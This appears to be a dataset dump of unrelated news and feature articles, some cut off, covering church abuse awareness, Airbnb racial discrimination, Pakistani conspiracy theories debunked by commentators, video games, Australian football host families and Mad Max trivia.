broader: posed not only to those who had been abused but to potential victims, too, those who had been merely sought out by an adult predator, as I had been. Imagine: for every child abused, the number of those who are tested and groomed as potential victims must be utterly staggering.\n\nMy sense about the pervasiveness of the problem was, sadly, proven correct over the next several hours, as the Storify post created by Jeff Chu demonstrates. The responses on Twitter were—and continue days later to be—overwhelming.\n\nAgain, it’s time for the church to stop being shocked and face reality with open eyes.\n\nLet me pause here to offer my own confession. I am situated doctrinally and culturally rather squarely within the conservative camp of evangelical Christianity. I need to acknowledge my disappointment at the overwhelming (although not total) silence from the leaders on my side of the church aisle, leaders for whom I have the deepest respect. It hurts not only me, but more importantly, the entire church body for these men not to be taking a greater lead in recognizing the scope of the problem and the suffering of the abused. It hurts the many that have been abused and should have every reason to hope the church would be where they would be most accepted, protected, and loved.\n\nOne expert estimates that between 1% and 5% of the population molest children. This means that if you know 100 adults, chances are good that at least one of them is a child molester. Maybe more. There is no evidence to suggest that the church population differs significantly in reflecting the general population.\n\nOf course, accepting the commonness of the problem does not mean accepting the problem. It is with sexual abuse as it is with a dog’s jumping: it should be neither shocking nor tolerated.\n\nNor does opening our eyes to the problem mean we should establish a battery of fear-based rules and regulations for young people and for those that serve them. Rather, we must be fiercely communicative, open, vigilant, and wise. We need to understand the fact that abusers, potential abusers, and their victims are all around us. There is no need to adopt a culture of fear, suspecting anyone whose hand we shake at Sunday morning worship is a thief—but we don’t leave our wallets unattended in the robe room either.\n\nHow old were you when you were pursued sexually by an adult authority figure?",

We support a lifestyle that impacts the Earth as little as possible. We love riding bikes, love to look good doing it, and most of all we love that riding a bike is good for our planet.”\n\nIn order to ensure the Little Portugal neighbourhood was comfortable with his new business, Sztabinski spent many hours speaking to scores of local residents to inform them of his plans, resulting in the community welcoming Fix into its midst.\n\nAt Fix you can buy a bike, get it repaired (any brand), and pick up inventive biking accessories ranging from wearable locks, to magnetic lights, retractable fenders and “the world’s smallest bike rack”.\n\nBut Sztabinski doesn’t want your relationship with Fix to end there.\n\nBike lovers can discuss biking culture and history with Sztabinski and his staff, take in its gallery showcasing ground-breaking bike manufacturers and enjoy fresh roasted coffee, teas and homemade pastries created in Fix’s on-site kitchen by its resident baker.\n\nTwo bike repair technicians and four baristas round out Fix’s staff.\n\nSztabinski (readers should know Fred and Ruth are my cousins) first got the idea for Fix about five years ago and for the past year and a half has been working towards its official opening earlier this month.\n\nHe’d like to follow in the footsteps of another Canadian entrepreneur who succeeded in the bike business after starting out in a different career, and who is now a key part of Fix’s business plan.\n\nThat’s Zak Pashak, owner and president of Detroit Bikes, the brand Sztabinski sells at Fix, describing them as North American-made “steel-framed, no-nonsense, everyday bikes for getting around town” that are “solid and look great.”\n\nPashak is a Calgary-born former DJ, club owner and music festival promoter, who moved to Detroit in 2012, where his family first settled generations ago, to start up his popular brand of affordable bikes — 8,000 sold last year — in a 50,000-square-foot-warehouse on the city’s west side, staffed by former auto engineers.\n\nSztabinski is selling three models of Detroit Bikes at Fix, ranging in price from $800 to $1,150.\n\nCharges for repairing bikes (any brand) are $15 for fixing a flat;$20 for wheel truing; $15 each for gear adjustments; $20 for small part installation; $70 for tune-ups and a labour rate of $70 an hour for bigger jobs.\n\nAnother source of inspiration for Sztabinski is Steven Bock, a clay sculptor of full-sized, prototype cars for the Big Three automakers, whose Detroit Bicycle Company, also located in the Motor City, produces world famous, high-end, hand-crafted bikes costing $4,000 to $8,000 apiece.\n\nBock’s one-man company — he hopes to expand eventually into a commercial operation selling a $1,000 version of his hand-crafted bikes — is the first bike manufacturer featured in Fix’s bike gallery, in what Sztabinski plans as a series of rotating exhibitions of renowned craft bike makers and their stories.\n\nFix is open seven days a week from 8 a.m. to 6 p.m. Monday to Friday and 9 a.m. to 4 p.m. Saturday and Sunday.\n\nIt you love bikes, and bike culture, you might want to drop by.\n\nlgoldstein@postmedia.com",
  "latent_12025": "In 2014, when Airbnb unveiled a new logo and branding, CEO Brian Chesky penned a gushing manifesto about how the home-sharing company was remaking the world. Airbnb, Chesky wrote, wasn’t just about renting a place to stay for the weekend—it was about “the universal human yearning to belong.\" Airbnb, he said, wanted to create \"a place where everyone can feel they belong.\"\n\nTwo years later, it is now very clear that Airbnb is not a place where everyone feels welcomed.\n\nOn Wednesday, Airbnb removed a North Carolina host from the platform after he unleashed a slew of racist remarks at a guest who had booked a stay in the host's home. Chesky called the incident “disturbing and unacceptable,” and said that the host had been permanently banned from using the site.\n\n\"Racial discrimination is unacceptable and it flies in the face of our mission to bring people together,\" said an Airbnb spokesperson by email.\n\nAdvertisement\n\nThis was only the most blatant recent example of racism on the platform. Black Airbnb users have been complaining for years about their troubles booking accommodations through the site, saying that white friends are able to book the same homes that reject them. One black user filed a lawsuit against the company last month for violating the Civil Rights and Fair Housing Acts. A study out of Harvard last year offered empirical proof of the trend, finding that users with black-sounding names were 16% less likely to be accepted when trying to book an Airbnb rental.\n\nAdvertisement\n\nThese issues are an ugly reminder of just how much prejudice remains in modern society, and a cautionary tale about what happens when you build a user-to-user marketplace that, inevitably, will bring these prejudices to light.\n\nSome users have found ways around biased hosts on Airbnb. Two years ago, Khadijah, a New Jersey professor, was traveling to Sausalito, Calif. for a friend’s wedding. There were plenty of homes in the area that showed up as available for the weekend of the wedding, but every time she tried to book, she was ignored or told the home was not available.\n\n“I started tailoring my messages to drop as much respectability into the narrative as I could, emphasizing that I was a professor,” Khadijah told Fusion. “I thought if I sounded more respectable, it would help me book a room, but it wasn't effective.”\n\nAdvertisement\n\nSo Khadijah asked her Facebook friends if anyone who was white would be willing to let her use their face.\n\n“A friend in her 60s, a white woman in Philadelphia, lent me her photo,” Khadijah told us. “I got a room pretty quickly after that.”\n\nAdvertisement\n\n(Fusion asked Airbnb if it violates the terms of service to use someone else's photo but the company did not answer the question.)\n\nKhadijah doesn’t blame Airbnb for her troubles, but thinks the company should do everything it can to lessen discrimination on the site. “They should create an algorithm to see if people of a certain race are being discriminated against by certain hosts and then send them a warning,” she said.\n\nIn fact, Airbnb said in a blog post last month that acknowledged its problems with discrimination that it plans to “fight bias with technology.”\n\nAdvertisement\n\n“Our data science teams will closely examine machine learning models and other tech tools we can use to help enforce our anti-discrimination policy,” wrote David King, Airbnb’s newly-hired director of diversity. Airbnb did not answer questions about how it might act on what its data science team finds.\n\nSo what can Airbnb do if it does discover that certain hosts are discriminating against certain kinds of users? Will it warn them? Ban them? Put them through the unconscious bias training it recently started offering?\n\n“As a platform with a two-way marketplace, it is impossible to take all bias out of the system,\" Rafat Ali, the founder of travel website Skift, told BuzzFeed. \"I do like what Uber does, which is it won’t show the driver who is requesting the ride until after the driver accepts it.”\n\nAdvertisement\n\nAirbnb is already doing a version of that, with a feature called Instant Book. As Airbnb explains in its anti-discrimination post, the feature \"helps ensure guests can book an Airbnb listing without prior host approval of a specific guest.\" This is much like the Uber system, in that the hosts don't see who's going to stay at their home until the booking has already been made.\n\nThe advantage of Instant Book is that it eliminates the chance of subconscious bias, such as a host who might choose a white guest over a black one if two requests come in around the same time. Many black users say they only try to book Airbnbs that have Instant Book enabled.\n\nHowever, it's not foolproof. Hosts still have the opportunity to cancel on an Instant-Booked guest three times per year with no penalties. In the case of the black guest in North Carolina, the Airbnb had already been booked when the host unleashed his racism and said he planned to cancel the reservation. And unlike Uber's similar feature, it's not universal—Instant Book listings make up only a fraction of the total Airbnb universe.\n\nAdvertisement\n\nTheoretically, Airbnb could force all hosts to participate in Instant Book. But if it did so, it might lose a lot of them. Home-sharing is a more intimate business than ride-sharing; most people are pickier about who they let sleep in their homes than who they let into their cars. Without the ability to vet requests, some hosts would certainly feel too uncomfortable to use the platform.\n\nOne of the questions raised here is the extent to which Airbnb can eliminate racism on its platform. It can certainly take actions that make it harder for racism to surface, by, for example, not showing people’s profile photos to one another at all—in the same way that we don't put our photos on our resumes when applying for jobs.\n\nBut even removing user photos wouldn't be a surefire way to erase racism: In the Harvard study, researchers found that names alone resulted in bias. (The fake profiles the researchers created for people of different races didn't include photos.) To get around this, Airbnb could let users employ pseudonyms—but again, that might spook hosts who would be letting a stranger stay in their homes without knowing what that person looks like or what their real name is. Ditching the profile photo could go a very long way towards eliminating bias on the platform, but it also might make users less inclined to use Airbnb at all.\n\nAdvertisement\n\nAnd, honestly, is it a good idea for Airbnb to set up its platform in such a way that a person of color might unknowingly wind up in the home of a virulent racist? Or vice versa? The woman who was verbally abused by the racist Airbnb host in North Carolina told a business school classmate, \"I was overwhelmed with the thought of what could have happened if I moved in without him finding out I was black. Would he have assaulted me physically or verbally etc? I just didn’t feel safe anymore.\"\n\nIt has become a Silicon Valley trope that the more companies like Airbnb try to change the world, the more they reinforce the problems in the world they set out hoping to disrupt. Racism in hotel bookings has not been a problem for decades. But Airbnb is now returning us to a version of the Jim Crow era when, if you were black, you needed a race-specific travel guide to offer tips and tricks on how to navigate the white world.\n\nAdvertisement\n\nIt isn't clear that Airbnb can make the racism on its platform—or in the world—go away.\n\nBut the company says it wants to. “[W]e’ve seen how the simple act of sharing a home can unite people from all walks of life,” the company's director of diversity wrote in a blog post last month. “We want to bring people together and fight the hidden biases that can prevent people from connecting.”\n\nOnly these biases are no longer hidden—they are staring us in the face. In the end Airbnb has shed light on a problem that exists not only on its platform, but also deep inside our culture.\n\nAdvertisement\n\nUpdate: Airbnb has announced that it has hired a former ACLU executive as a consultant to examine bias on the platform.",

Most of the country’s troubles and travails are, in fact, not homegrown, but the result of an omnipotent Jewish lobby — also known as a yahoodi saazish. And if it’s not the Jews stirring up trouble, it must be the Indians.\n\nHere in Pakistan, we love our conspiracy theories. Bored of mundane explanations for the country’s problems, such as mismanagement, poor governance and political instability, we eagerly come up with alternative theories to keep things exciting — and, more often than not, the media also joins the conspiracy chorus.\n\nWhat has been the wildest conspiracy theory pertaining to Pakistan? Herald invited a number of writers, commentators and intellectuals to sound off on the question.\n\nThe almighty USA had bombed the area between Kaghan and Kashmir to capture Osama Bin Laden, causing an earthquake in the process\n\nSupporters of Jamiat Ulama-e-Islam burn an American flag to condemn the killing of Osama bin Laden, in Kuchlak | AP\n\nI heard the mother of all conspiracy theories in November 2005, a month after the earthquake. I was forced into visiting a family, where the husband worked for the government in some mid-level job. While the women got talking, the man leaned over, sly smile and jogging eyebrows, to conspiratorially ask me what I thought of the earthquake. “Bhonchal baray ki khyal ae fer?”\n\nThe demeanour left me reeling. Why, a hundred thousand innocent souls had perished, property worth billions destroyed and he thought it was some trivial absurdity. Seeing my reaction, he condescendingly informed me that he knew the reality from a ‘respectable’ Urdu paper.\n\nThe story was OBL’s extermination in his hideout somewhere between Kashmir and Kaghan. Why, I had to be stupid and ignorant if I did not know that almighty USA had bombed the area to get the man! The bomb was one humongous meanie that bored deep into the ground before blowing itself up. Hence the earthquake.\n\nBut here was the twist. The Indians said they would only permit the scheme to go through if no damage was caused on their side of the border. That was a cinch for almighty USA. Why, they had just the kind of bombs that could guide destruction in any programmed direction and the Indians had nothing to worry about.\n\nThe Americans sent their invisible fleet of jets with their gopher arsenal that burrowed right under the mountains and detonated under OBL’s bed, even as the man was preparing to rise for the dawn prayer. For good measure and in order to teach Pakistan a sound lesson for harbouring a terrorist even as we pretended to be a US ally, it was ensured that a goodly portion of the rest of the country got plastered as well.\n\nThe man who believed this story was 59. I think he also believed in Santa Claus and the Tooth Fairy.\n\nBy Salman Rashid, travel writer and fellow of Royal Geographical Society\n\nThe US is behind all terror attacks in Pakistan\n\nSupporters of Jamaat-e-Islami chant slogans during an anti American rally in Abbottabad | AP\n\nSunshine bores the daylights out of folk in Pakistan, particularly our quaint Islamabad — city of the faithful, where faith means believing in things even when common sense suggests otherwise. In this capital of rumors and allusions, we’ve learned to understand political phenomena mostly in terms of conspiracy. And sure, a little intrigue never hurt anyone. But can we afford to chase after shadows when real monsters haunt the land?\n\nMy favourite theory: The Taliban are secretly working for the US; or another version of the same theory: That the US is behind all terror attacks in Pakistan.\n\nThis theory makes me feel sorry for the conspiracy theorist and even more so for the Taliban. A majority of those who defend this theory – that the Taliban are in cahoots with the US – are also the same people you will hear championing the Taliban as the great guardians of Islam each time they execute a successful attack against a US target. Which also makes the US – this so-called sponsor of attacks on itself – a champion of Islam.\n\nIt’s a shame because I don’t think the conspiracy theorists intended to make this point. It’s our fault for making the connection.\n\nThe worst part is that this theory completely undermines the hard work and planning the Taliban put into each attack. How frustrated must they feel when they carry out spectacular assaults and everyone turns around and says the US must be behind them? It’s unfair, dammit.\n\nOn a serious note, I have my own conspiracy theory about why Pakistanis love conspiracies: When secrecy is part of the very system of government, when all you have are the shreds of ‘truth’ that you get from your elected representatives, military officials and the media, sometimes you can’t help but buy the cuckoo explanation or reach the wacky conclusion. Simply put, rationality is much more likely to thrive in a space of better information.\n\nBy Mehreen Zahra-Malik, Pakistan correspondent for Reuters\n\nThe real Ajmal Kasab, despite a public hanging, is still alive\n\nA man reads a newspaper about the legal process over the Mumbai attacks, in Kolkata | AFP\n\nI came across a Facebook page one day stating that a certain Ajmal Kasab was an entirely different person to the one shown in captivity by Indian law enforcement. It also said that the real Kasab, despite an unfortunate public hanging, was very much alive and well.\n\nThis wasn’t overly surprising, after all, there used to be a Facebook page dedicated to the idea that Hitler was still living in some Italian monastery as a nun.\n\nBut this page claimed to have proof.\n\nThere were photos. It was hard to tell from them whether the man’s name was Ajmal Kasab or not, as it was hard to tell whether the man was from Faridkot, Okara, or even Pakistan. But, at least, there were photos, which bore no resemblance to the alleged Kasab who died in India, just like the other seven billion or so people on this earth that bore no resemblance to him.\n\nBut wait! There was more. The page, lovingly devoted to exposing the treacheries of ‘Jew TV’, also claimed that the entire drama had been staged by RAW agents, on the payroll of CIA, who had bribed Pakistani news channels to create a false background for Kasab, and had paid then interior minister Rehman Malik to allege that he had received training from Lashkar-e-Taiba.\n\nKasab I mean, not the minister, who sounds like he’s never received any kind of training in his life. Well I read the page, had a good chuckle, left the obligatory ‘Helo brothers, myself am actually Ajmal Kasab but have to change the name becaus RAW is behind me’ comment, and moved on with my life. Fast forward to earlier this May when I read about a school teacher from Okara claiming, in a court of law, to have met the real and presumably still living Ajmal Kasab only a few days prior to giving his testimony. He was providing testimony in the trial of the nine Lashkar-e-Taiba members allegedly involved in planning the Mumbai attacks, and had previously testified to not knowing Kasab at all, in addition to saying he’d been threatened for siding with the prosecution.\n\nStill, one spark is all that’s needed to rekindle a fire. I think I’ll stop browsing Facebook for a while.\n\nBy Haseeb Asif, Lahore-based writer\n\nBelieving that there are no conspiracies\n\nUS national and CIA contractor Raymond Davis | AP\n\nWorse than the conspiracy theories themselves is how many of them have actually been proven (even partially) correct. Take the whole ‘polio vaccinators are spies’ one for example. Well, guess what? It turned out that the CIA, true to form, actually were using such covers for its extensive spying program. It has now promised not to do so again, which means that they’ll probably move onto bigger and better cover identities.\n\nThen there’s Blackwater, reports of which were initially considered rabid fear mongering. Once again, the claims, even if some were completely wild, were not too far off the mark. And as for reports of omnipresent CIA agents roaming around Pakistan, armed and up to no good? Well, Raymond Davis is exhibit A here. The same could be said of the early claims that drones were in fact operated from Pakistani territory; they were. And what about the oft-repeated belief that the TTP et al are ‘foreign agents’? Well, there is certainly evidence of facilitation from across the borders, and there is the small matter of Mullah Fazlullah being located in Kunar. Add the CIA’s Penny Lane facility to the mix, which aimed to ‘turn’ jihadis into double agents, factor in Abdullah Mehsud’s post-Guantanamo attacks on the Chinese in Pakistan and you have what seem to be the dots of a rather vast conspiracy.\n\nAnd here’s where the theorists tend to overreach: They keep drawing lines even when the dots run out, connecting to the Rockefellers, the Illuminati with a dose of Dajjal thrown in. That then makes their claims wild-eyed and implausible to most thinking people. Over-indulgence in these theories does of course effectively absolve one of national responsibility for the mess we find ourselves in, but to believe that there are no conspiracies may well be the greatest conspiracy theory of all.\n\nBy Zarrar Khuhro, Assistant Editor, Dawn\n\nThe HAARP Conspiracy\n\nThat cold day in Alaska, the air was thick with tension as HAARP director Dr Abraham Yehud, watched by other white-coated scientists, unlocked the control panel and pressed the red button. A powerful burst of electromagnetic waves from HAARP’s 180 VHF transmitters smashed into the earth’s ionosphere, creating plasma hot spots that merrily danced in the sky. Years of patient physics research, aimed at coupling the earth’s mantle to charged atmospheric ions, was now at stake. All eyes went to the global seismograph monitors fixed on the walls. For a while nothing showed. Then wild cheering broke out — Northern Pakistan was bucking like a bronco. When it was all over, there were 90,000 dead under the rubble.\n\nFast forward five years to 2010. The ambitious Dr Hanood, though distrusted by some because of his dual nationality, had ousted Dr Yehud. Widely respected in the CIA for his expertise in weather change, he was a patient man. A decade-long study of monsoon patterns in South Asia had convinced Hanood that now was the time to act. Enhanced solar activity meant that HAARP’s pulses could go unnoticed if emitted at moderate intensity. But they could still do the job if turned on for at least nine days. He was right. By July, a flood of biblical proportions left a fifth of Pakistan under water.\n\nThis fictionalised story is not pure fiction. In the October 17, 2010 issue of Dawn, Pakistan’s premier scientist, a Fellow of the Royal Society and former head of the Higher Education Commission, wrote an eye-popping article entitled “HAARP”. He suggested that many disasters which Pakistanis normally assume to be natural were, in fact, deliberately engineered by the United States. The good doctor has subsequently retreated somewhat from his position that HAARP caused the 2005 earthquake, but still insists that it could cause floods and weather change. A good course in high school physics could disabuse him of even this possibility. Meanwhile his article makes it understandable why, in spite of the billions pumped into it, Pakistan’s higher education system progressed so little in his tenure.\n\nBy Pervez Hoodbhoy, nuclear physicist, essayist and peace activist\n\nThis was originally published in Herald's June 2014 issue.

  "latent_12445": "Ubisoft announced today the release date for almost every version of stealth, hacking open-world game Watch Dogs. While the game will be coming to PC, PlayStation 3, PS4, Xbox 360 and Xbox One on May 27, there's still no date for the Wii U version.\n\nBut Dominic Guay, senior producer on the game, tells Polygon that it is still very much in development.\n\n\"Yeah it's still alive,\" he said. \"We still haven't defined a ship date for it, though. So it's on hold, to a certain extent for shipping.\"\n\nHe added that a 2014 ship date for that version of the game is still a \"possibility.\"\n\n\"We don't have a specific ship date for it yet so it's considered within the year,\" he said. \"So we're going to look at that and we're going to let people know as soon as we figure out an exact date for it.\"\n\nOne of the reasons the Wii U version of the game isn't hitting the same release date as every other platform is because it's the only version not being developed in concert by the team in Montreal.\n\n\"We have our studio in Bucharest working on it, and we wanted that team to have the time to explore the GamePad and be able to have fun with it and see how far they could push it,\" he said. \"It's also an interesting platform, because it has its own strength, which we want to take advantage of, and we didn't want to delay all the other platforms for that one. So we're going to take the time we need to make sure the game is good (technically) when we ship it and that it also, game design-wise, makes good use of the specifics of the Wii U.\"\n\nGuay still believes the Wii U is a good fit for Watch Dogs and its playstyle, in particular because of the GamePad.\n\nA 2014 ship date for that version of the game is still a \"possibility.\"\n\n\"I mean, for our game, when we play with everything being connected, we need to make smart use of it,\" Guay said. \"And also, the Wii U came along at some point in our production, so it planned through for it, and now to a certain extent we wanted to be ambitious with it, be able to go full-on and make full use of the platform. That's why we're taking more time, but it's being worked on so that's good.\"\n\nThe game development's shift to Ubisoft Romania in Bucharest was driven in part by a question of capability, Guay said. He added that that specific team is extremely strong technically and that there was a lot of technical work that had to go into getting the engine that drives Watch Dogs to work on the Wii U.\n\n\"It wasn't running on Wii U initially,\" he said. \"They were the perfect team to do it. Our Bucharest studio is super strong, super strong engineers and I was impressed by how quickly they got to get the game running on the console. And they were so autonomous in doing it. Obviously we're communicating and we're working together, but they were so quick and smart in doing it, it still made sense for them to keep ownership. Obviously they're using the same game content, so they're not building other game content. It's the same game content that we'll adapt for the needs of the specific needs of Wii U. But at the core, same game, but they made all the technical adjustments for it.\"\n\nWatch Dogs, which was unveiled at E3 in 2012, was originally slated for a holiday 2013 release. That was pushed back just a month before the street date. Last month, Ubisoft's Yves Guillemot said that the Wii U version of the game wouldn't be arriving with the rest of the platforms.",
  "latent_12457": "THEY’RE the ones behind the scenes that help hold it together for new recruits: the host families that take in young footballers and care for them like the young boys they are rather than the star footballers they hope to become.\n\nSince the introduction of the national draft, footballers as a norm no longer come from the district and grew up around the corner: at clubs such as Adelaide and Port Adelaide, a new player is just as likely to come from Victoria as he is from one of the SANFL clubs.\n\nHomesickness and the pull from family in another state has never been as highlighted: much speculation will surround Patrick Dangerfield’s future this year as he decides whether to stay with the Crows or whether to return to the Victorian surf coast.\n\nMaria and Sav Ruggiero, Crows supporters who live close to the club and have friends who work there, put their hand up to help out while son Anthony was still in his teens and said it had been worth all the work in putting up new players.\n\nMaria Ruggiero with Crows young guns Brad Crouch and Jarryd Lyons. Source: Supplied\n\nThey’re expecting another one after Christmas — players generally spend the first few weeks with a senior player as way of introduction — and can look forward to more big Monday night dinners when they are joined by players who have stayed with them in the past and their teammates.\n\nJarryd Lyons, who stayed with the Ruggieros when he first arrived at West Lakes back in 2010, said they could not have been more important as he settled into life as a professional footballer.\n\n``I don’t know how I would have done it without Sav and Maria,’’ he said. ``They helped me find my way around, were there when I came home exhausted from training and I still drop in at least two or three times a week.\n\n``There’s always a good feed on ... they’re amazing people.’’\n\nSav and Maria Ruggiero have played host to Jarryd Lyons and Jack Gunstan. Source: Supplied\n\nOver the years, Maria and Sav have been surrogate parents for players Myke Cook, Tom Lee, Jack Gunstan, Lyons, Brad Crouch and Matt Crouch and formed strong bonds not only with the players, but also their parents and teammates.\n\n``We were approached by a mutual friend about 10 years ago\n\nIt is not unusual for eight to 10 players — the ones who used to live there and teammates — to come around to their western suburbs home for a Monday night dinner. Those who drop in include captain Nathan van Berlo, Taylor Walker, Jared Petrenko, Ricky Henderson and Daniel Talia.\n\nBut as much as it adds to the family’s workload, Maria said the arrangement had been just as rewarding for the Ruggieros as it had been for the players.\n\nSav and Maria with their son Anthony and Jarryd Lyons. Picture Dean Martin Source: News Corp Australia\n\nThey have been busy days, because both Maria and Sav work long hours, but they’re not the types who look for idle living.\n\nMaria speaks of bonds that will last for a lifetime and friendships that will last beyond football careers and players changing clubs.\n\n``It is difficult for them, the poor things,’’ Maria said. ``They’re all excited about getting to a football club, but then all of a sudden reality hits ... where are my friends? Where are my family?\n\n``It all takes a toll on them.

  "latent_12465": "Which ships will be capable of transporting a Nox?\n\nThe most common question we get, and in this case our most upvoted, too! While we haven’t finished testing the Nox’s storage capability in every in-game ship, it can be used comfortably in a Freelancer, Cutlass (new) and Constellation. For smaller ships with cargo space like the Reliant & Avenger, it can physically fit but it cannot be secured. It’s not likely that will go well in practice, but we expect you to try it all the same and let us know when the Nox is added to the game.\n\nWhen in atmosphere, is the Nox a ground-only vehicle, or can it also fly at higher altitudes, across canyons, through clouds, etc.\n\nWhile the Nox will always has access to its multitude of thrusters, fighting gravity can be strenuous and ultimately unsustainable. Like the Dragonfly before it, the Nox can be used in space and on the ground, but it cannot make the transition on its own. For the purposes of operating down surface-side, it’s best to think of the Nox as a ground vehicle in this regard.\n\nWhen water/oceans are added to the game, will the Nox be able to speed across the water at a high enough speed?\n\nYes. We thought about making a longer answer to this, but decided not to. Don’t you hate it when you get long-winded answers that can ultimately be summed up in just a single word? Brevity is the soul of wit, as they say. I don’t remember who said it, though.\n\nWhat is the max type of wearable armor can I wear while flying the Nox?\n\nThis is a topic that affects all ships in Star Citizen. Currently, we are still evaluating what armors you’ll be allowed to wear when piloting any ship or vehicle in the game.\n\nHow fast can the Nox fly in space?\n\nAt present, the Nox has a top SCM of 220 and with afterburner can reach speeds of 550 in space. On the ground, that ratio is 40/100. 100 meters per second, 1 meter off the ground is pretty impressive.\n\nDoes the Nox handle rough terrain any different or worse than the Dragonfly?\n\nEven though vehicles like the Nox (and the Dragonfly before it) hover over terrain, it will still have effects on its handling. In this regard, the Nox might not handle very coarse terrain as well as the more utility-built Dragonfly.\n\nDoes the Nox have a storage compartment for small items?\n\nIt does not. The limited cargo capacity of the Dragonfly comes at the sacrifice of its rear passenger seat. The Nox is purpose built to get you where you’re going, with greater speed, and even greater style.\n\nWill we ever be able to paint our own ships? If so, what makes the Nox Kue limited?\n\nWe do not have specifics to detail on the paint system at this time. In the case of limited edition ships like the Nox Kue (or the Dragonfly Yellowjacket) we don’t think the idea of decorating your own ship is incongruous with having manufacturer-offered editions. This is patterned after real life automotive manufacturers who typically offer a predetermined set of finishes (including limited editions.) Any car you buy today can, with varying degrees of expense and effort, be repainted to match any color of the rainbow… but collectors ascribe significant value only to the original finishes (which are also often more difficult to replicate exactly on the secondary market.) We are also exploring the idea of unique badges and identifiers for the limited edition variants. In short, while you may be able to paint a standard Nox silver in the future, it won’t ever be a “Nox Kue.”\n\nCan I store a rifle or any larger weapons on/in as it seems you can’t ride it with anything other than a pistol?\n\nUnfortunately no. Like a cave in the swamps of Dagobah, you have only what you take with you.\n\nDoes it lean when it turns?\n\nCurrently in testing, it will lean with you when you strafe, and when you are done with the yaw portion of the turn, you will continue to lean until you stop skidding. It’s pretty cool.\n\nWill the Nox be faster than the Dragonfly?\n\nUnder ideal conditions, the Nox with its Competition-class components will give you a distinct advantage in races. That said, the Dragonfly may take the advantage over more difficult terrain. Choose your routes wisely.\n\nWill the Nox have upgradable components like shields and power plants?\n\nVehicle-scale components are a relatively new addition to our ship item system. The Nox comes with Competition Grade C components. In the future, we intend you to be able to customize the components with higher grade Competition options. What other styles of components will be compatible with the Nox remains to be seen.\n\nHow is the Nox “powerful in combat” as stated in ATV ?\n\nWhen Chris Smith mentioned the Nox being “powerful in combat” on ATV, he was referring to its direct comparison with the other vehicle in its class, the Drake Dragonfly. While similarly armed, the Nox would seem to have the advantage in speed that allows you to chase down your targets efficiently, tremendous agility with its 16 maneuvering thrusters, and the added armor that protects its passenger more adequately from incoming fire.\n\nWill the Nox have stealth capability, or have access to stealth capability in some way?\n\nStealth in Star Citizen is mostly about managing the emissions you make. In this regard, you will still have the same flexibility to manage your power consumption and overall signature as you will on any other ship. Additionally, you may find added benefit if you choose to replace your competition components with stealth items, but to do so would come at the cost of overall speed and performance.\n\nDoes the Nox have landing gear, for when it’s powered all the way down?\n\nNo, the Nox hovers at all times with emergency power. If you’ve drained even that, it will fall and be sad. Take care of your Nox.\n\nWhat makes the Nox almost as expensive and in some cases more than a spaceship with jump engine and quantum drive?\n\nIt’s important to remember that ships are priced using a component matrix rather than some type of ladder that climbs from one to another. This matrix accounts for many factors including individual component types and rarity. The Nox, for instance, has a number of purpose-built racing components where the Aurora uses more common, mass produced equipment as it is intended both in and out of lore to be a vehicle that introduces new pilots to space travel. While it’s true that the Nox does not have a jump engine or a quantum drive of an Aurora, it boasts performance and provides specialization in its intended role that the former cannot match. (For comparison, a purpose-built racing bike can cost significantly more than an entry level car today, despite ‘only’ having two tires.)\n\nIs this mainly a racer, or does it have other purposes i.e. ground combat?\n\nWhile primarily designed for speed, with its high maneuverability and S1 ship weapons, the Nox has a devastating potential in flanking slower and squishier infantry. Just don’t crash into things. Another major ‘game purpose’ of the Nox (and Dragonfly) that shouldn’t be understated is for traveling around our procedurally generated worlds. In a word, they’re BIG… so you’ll want a fast vehicle to traverse their surfaces and explore their mysteries.\n\nCan I gimbal the guns if I choose? or am I stuck with fixed?\n\nLike the Dragonfly before it, the Nox can only use S1 fixed weaponry.\n\nWhat distance can it travel on maximum speed?\n\nStandard SCM flight on ships doesn’t burn fuel in the sense we know today. With the technological advancements of 930 years, ships equipped with the proper intakes like the NOX can create and replenish the fuel necessary for everyday operation. In this way, you can travel at maximum SCM speed for extended periods of time. For afterburner speed, you will still have a limited amount of fuel as with any other ship.\n\nIf the Nox loses power, would we be trapped in our seat by the articulating back plate?\n\nPresently, the back will articulate anyway, although it’s an interesting idea that might warrant a unique animation for such an event in the future.",
  "latent_12478": "The grandaddy of all dystopian action extravaganzas, Mad Max burst into cinemas in 1979 in all of its super-charged, leather-clad glory, changing genre cinema forever. Influenced by the 1973 oil crisis that turned many motorists all over the globe to violence, Mad Max depicted a desolate world with long stretches of highways interrupted only by derelict signs of civilization. The remnants of a once strong police force, the Main Force Patrol do their best to maintain law while wild gangs of outlaw bikers loot, rape, and siphon their way through society. One of these officers, Max Rockatansky, looses faith in the justice after his best friend, wife, and infant son fall victim to the nastiest gang of them all, led by the Genghis Khan of the wasteland, the Toecutter.\n\nShot over 12 weeks in and around Melbourne with a humble budget of $350,000 (Australian), the making of Mad Max was sometimes just as chaotic and dangerous as the world depicted in the film. Director George Miller, making his first feature, pulled together every resource imaginable making his mean-spirited opus. The birth of Mad Max was filled with broken bones, military rocket boosters, and suicide missions to get the most insane shot that was as close to the action as possible. These were real men doing real stunts in real cars going over 100 mph. Sure the stunts and car chases in Mad Max‘s arguably superior sequel The Road Warrior may be more impressive at times, but that movie had a lot more support behind it with over 10 times the original’s budget. How did Miller and his crew get it all done? Let’s take a look with 10 things you didn’t know about Mad Max.\n\n10) Mel Gibson Busted Face Got Him the Role\n\n21-year-old Mel Gibson only went to the audition to support one of his friends, Steve Bisley who would score the role of Goose. Gibson was in a bar fight the night before and his face was a swollen mess of black-and-blue. Seeing something behind the bruises, one of the casting agents spotted the battered Gibson and told him to come back in three weeks because they needed “freaks.” Three weeks later, a healed-up Gibson returned and charmed the pants of the filmmakers with his pretty-boy ruggedness. They asked him to read for Max and you know the rest (the above pic is from The Road Warrior, but it works for this entry).\n\n9) The Art Director Was a Thief\n\nArt director Jon Dowding and his prop department had to make the most of their low budget — even if that meant stealing just a wee bit. On the DVD commentary, Dowding confesses that he stole most of the props and signage seen outside the milk bar (convenience store) where Jessie goes to get ice cream. He stole everything early in the morning, they shot the scene, and he put everything back where he found it during the night. Don’t worry, Dowding offers a sincere apology in the commentary.\n\n8) Beer Went A Long Way On Set\n\nAnd I don’t mean Mel Gibson got drunk and berated the Jews. Director George Miller bribed a lot of people to work on the film with “slabs” of beer. In Australia, a “slab” is a case of 24 cans. Slabs were used to pay ambulance drivers, a tractor driver, and it’s safe to imagine some of the bikers as well. Sounds like a fair deal to me.\n\n7) It Was Inspired by Car Accident Victims\n\nWriter and director George Miller used some gruesome inspiration for Mad Max. Miller was a medical student and completed his residency at a Sydney hospital in 